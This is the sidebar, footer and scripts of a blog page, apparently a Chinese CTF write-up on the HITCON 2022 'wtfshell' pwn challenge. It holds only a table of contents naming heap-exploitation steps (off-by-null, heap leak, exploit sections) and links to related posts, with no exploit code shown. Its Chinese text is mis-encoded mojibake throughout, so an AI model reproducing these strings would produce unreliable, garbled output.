      <div class="contents panel pjax" data-title="æ–‡ç« ç›®å½•">
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text"> å‰è¨€</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.1.</span> <span class="toc-text"> ä»£ç å®¡è®¡</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E4%B8%BB%E8%A6%81%E9%80%BB%E8%BE%91"><span class="toc-number">1.1.1.</span> <span class="toc-text"> ç¨‹åºä¸»è¦é€»è¾‘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">1.1.2.</span> <span class="toc-text"> æ¼æ´ç‚¹</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%A7%E4%BF%A1%E9%81%93"><span class="toc-number">1.1.2.1.</span> <span class="toc-text"> ä¾§ä¿¡é“</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#user%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">1.1.2.2.</span> <span class="toc-text"> user ç»“æ„ä½“</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#strtok-off-by-null"><span class="toc-number">1.1.2.3.</span> <span class="toc-text"> strtok-&gt;off by null</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wtfshell1"><span class="toc-number">1.2.</span> <span class="toc-text"> wtfshell1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%A0%86%E5%9C%B0%E5%9D%80"><span class="toc-number">1.2.1.</span> <span class="toc-text"> æ³„éœ²å †åœ°å€</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0off-by-null"><span class="toc-number">1.2.2.</span> <span class="toc-text"> æ„é€  off-by-null</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BE%97%E5%88%B0%E4%B8%80%E4%B8%AA%E5%A1%AB%E6%BB%A1%E7%9A%84gbuff%E5%A0%86%E5%9D%97"><span class="toc-number">1.2.2.1.</span> <span class="toc-text"> å¾—åˆ°ä¸€ä¸ªå¡«æ»¡çš„ gbuff å †å—</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0off-by-null-2"><span class="toc-number">1.2.2.2.</span> <span class="toc-text"> æ„é€  off by null</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">1.2.2.2.1.</span> <span class="toc-text"> é‡åˆ°çš„é—®é¢˜</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#prev_size"><span class="toc-number">1.2.2.2.1.1.</span> <span class="toc-text"> prev_size</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#fake_size"><span class="toc-number">1.2.2.2.1.2.</span> <span class="toc-text"> fake_size</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E6%93%8Doff-by-null"><span class="toc-number">1.2.2.3.</span> <span class="toc-text"> å®æ“ off by null</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%B9%E5%BF%83%E9%A5%BC%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.3.</span> <span class="toc-text"> å¤¹å¿ƒé¥¼æ”»å‡»</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wtfshell1-exp"><span class="toc-number">1.2.4.</span> <span class="toc-text"> wtfshell1-exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wtfshell2"><span class="toc-number">1.3.</span> <span class="toc-text"> wtfshell2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#wtrshell2-exp"><span class="toc-number">1.3.1.</span> <span class="toc-text"> wtrshell2-exp</span></a></li></ol></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="ç³»åˆ—æ–‡ç« ">
        <ul>
          <li class="active"><a href="/2022/12/01/hitcon-wtfshell/" rel="bookmark" title="hitcon2022-wtfshell">hitcon2022-wtfshell</a></li><li><a href="/2023/03/31/%E4%BB%8Eciscn2022%E4%B8%80%E9%81%93%E4%B8%80%E8%A7%A3%E9%A2%98%E6%B5%85%E6%9E%90msg_msg%E7%BB%93%E6%9E%84%E4%BD%93/" rel="bookmark" title="ä»ciscn2022ä¸€é“ä¸€è§£é¢˜æµ…æmsg_msgç»“æ„ä½“">ä»ciscn2022ä¸€é“ä¸€è§£é¢˜æµ…æmsg_msgç»“æ„ä½“</a></li>
        </ul>
      </div>
      <div class="overview panel" data-title="ç«™ç‚¹æ¦‚è§ˆ">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="LoÏ„Ï…s"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">LoÏ„Ï…s</p>
  <div class="description" itemprop="description">å‡Œæ’å±±å…¶è‹¥é™‹å…®ã€</div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">23</span>
        <span class="name">æ–‡ç« </span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">4</span>
        <span class="name">åˆ†ç±»</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">7</span>
        <span class="name">æ ‡ç­¾</span>
      </a>
    </div>
</nav>

<div class="social">
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>é¦–é¡µ</a>
  </li>

    
  <li class="item">
    <a href="/about/" rel="section"><i class="ic i-user"></i>å…³äº</a>
  </li>

        
  <li class="item dropdown">
      <a href="/default/" rel="section"><i class="ic i-feather"></i>æ–‡ç« </a>
    <ul class="submenu">

        
  <li class="item">
    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>å½’æ¡£</a>
  </li>

        
  <li class="item">
    <a href="/categories/" rel="section"><i class="ic i-th"></i>åˆ†ç±»</a>
  </li>

        
  <li class="item">
    <a href="/tags/" rel="section"><i class="ic i-tags"></i>æ ‡ç­¾</a>
  </li>

  </ul>

</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2022/09/04/%E7%BE%8A%E5%9F%8E%E6%9D%AF/" rel="prev" title="ä¸Šä¸€ç¯‡"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" rel="next" title="ä¸‹ä¸€ç¯‡"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>éšæœºæ–‡ç« </h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/CTF/" title="åˆ†ç±»äº CTF">CTF</a>
</div>

    <span><a href="/2021/09/09/64%E4%BD%8D%E6%A0%87%E5%87%86ROP%E4%B8%8E%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1/" title="æ ‡å‡†64ä½ç¨‹åºROPæµç¨‹å’Œå †æ ˆå¹³è¡¡">æ ‡å‡†64ä½ç¨‹åºROPæµç¨‹å’Œå †æ ˆå¹³è¡¡</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/CTF/" title="åˆ†ç±»äº CTF">CTF</a>
</div>

    <span><a href="/2022/07/15/DSCTF%E9%83%A8%E5%88%86wp/" title="DSCTF pwn éƒ¨åˆ†wp">DSCTF pwn éƒ¨åˆ†wp</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/CTF/" title="åˆ†ç±»äº CTF">CTF</a>
</div>

    <span><a href="/2022/03/13/Tcache%20bin%E6%80%BB%E7%BB%93/" title="Tcachebin æ€»ç»“">Tcachebin æ€»ç»“</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/CTF/" title="åˆ†ç±»äº CTF">CTF</a>
</div>

    <span><a href="/2021/09/07/Libcsearcher%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" title="LibcSearcherç¯å¢ƒé…ç½®å’Œubuntuæ›´æ–°æ¢æºé—®é¢˜">LibcSearcherç¯å¢ƒé…ç½®å’Œubuntuæ›´æ–°æ¢æºé—®é¢˜</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="åˆ†ç±»äº å­¦ä¹ ç¬”è®°">å­¦ä¹ ç¬”è®°</a>
</div>

    <span><a href="/2021/10/30/%E5%A0%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-UAF/" title="å †å­¦ä¹ -UAF">å †å­¦ä¹ -UAF</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/CTF/" title="åˆ†ç±»äº CTF">CTF</a>
</div>

    <span><a href="/2021/11/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020-format_string/" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¿›é˜¶">æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¿›é˜¶</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/CTF/" title="åˆ†ç±»äº CTF">CTF</a>
</div>

    <span><a href="/2022/04/06/wustctf2020_babyfmt/" title="wustctf2020_babyfmt">wustctf2020_babyfmt</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/CTF/" title="åˆ†ç±»äº CTF">CTF</a>
</div>

    <span><a href="/2021/09/25/%E7%94%B5%E7%A7%91%E6%96%B0%E7%94%9F%E8%B5%9B/" title="ç”µç§‘æ–°ç”Ÿèµ›">ç”µç§‘æ–°ç”Ÿèµ›</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E9%9A%8F%E8%AE%B0/" title="åˆ†ç±»äº éšè®°">éšè®°</a>
</div>

    <span><a href="/2024/01/01/2024/" title="2023å¹´åº¦æ€»ç»“">2023å¹´åº¦æ€»ç»“</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="åˆ†ç±»äº å­¦ä¹ ç¬”è®°">å­¦ä¹ ç¬”è®°</a>
</div>

    <span><a href="/2021/10/24/%E5%A0%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-chunk%20overlapping/" title="å †å­¦ä¹ -Chunk Overlapping">å †å­¦ä¹ -Chunk Overlapping</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>æœ€æ–°è¯„è®º</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 â€“ 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">LoÏ„Ï…s @ LoÏ„Ï…s</span>
  </div>
  <div class="powered-by">
    åŸºäº <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2022/12/01/hitcon-wtfshell/',
    favicon: {
      show: "ï¼ˆâ—Â´3ï½€â—ï¼‰ã‚„ã‚Œã‚„ã‚Œã ãœ",
      hide: "(Â´Ğ”ï½€)å¤§å¤‰ã ï¼"
    },
    search : {
      placeholder: "æ–‡ç« æœç´¢",
      empty: "å…³äº ã€Œ ${query} ã€ï¼Œä»€ä¹ˆä¹Ÿæ²¡æœåˆ°",
      stats: "${time} ms å†…æ‰¾åˆ° ${hits} æ¡ç»“æœ"
    },
    valine: true,fancybox: true,copyright: 'å¤åˆ¶æˆåŠŸï¼Œè½¬è½½è¯·éµå®ˆ <i class="ic i-creative-commons"></i>BY-NC-SA åè®®ã€‚',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
